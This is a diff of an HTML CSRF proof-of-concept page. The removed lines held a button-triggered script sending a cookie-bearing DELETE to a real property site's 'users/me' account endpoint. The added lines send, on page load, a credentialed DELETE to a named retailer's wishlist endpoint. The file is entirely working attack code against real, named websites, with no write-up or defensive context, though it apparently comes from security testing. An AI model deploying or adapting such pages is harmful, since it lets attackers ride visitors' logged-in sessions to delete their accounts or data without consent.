@@ -1,23 +1,16 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h1>CSRF PoC - JavaScript DELETE Attempt</h1>
-    <button onclick="sendCSRF()">Click to trigger DELETE</button>
-
+    <h1>CSRF PoC - Remove Wishlist Item</h1>
     <script>
-      function sendCSRF() {
-        fetch("https://user-api.zimmo.be/users/me", {
-          method: "DELETE",
-          credentials: "include", // Send cookies
-        })
-        .then(response => response.text())
-        .then(data => {
-          console.log("Response:", data);
-        })
-        .catch(error => {
-          console.error("Error:", error);
-        });
-      }
+      fetch("https://www.beautyexpert.com/wishlist/removeFrom.collections?fromWishlist=true&productID=12595875", {
+        method: "DELETE",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(["12595875"])
+      }).then(res => console.log("Request sent", res));
     </script>
   </body>
 </html>
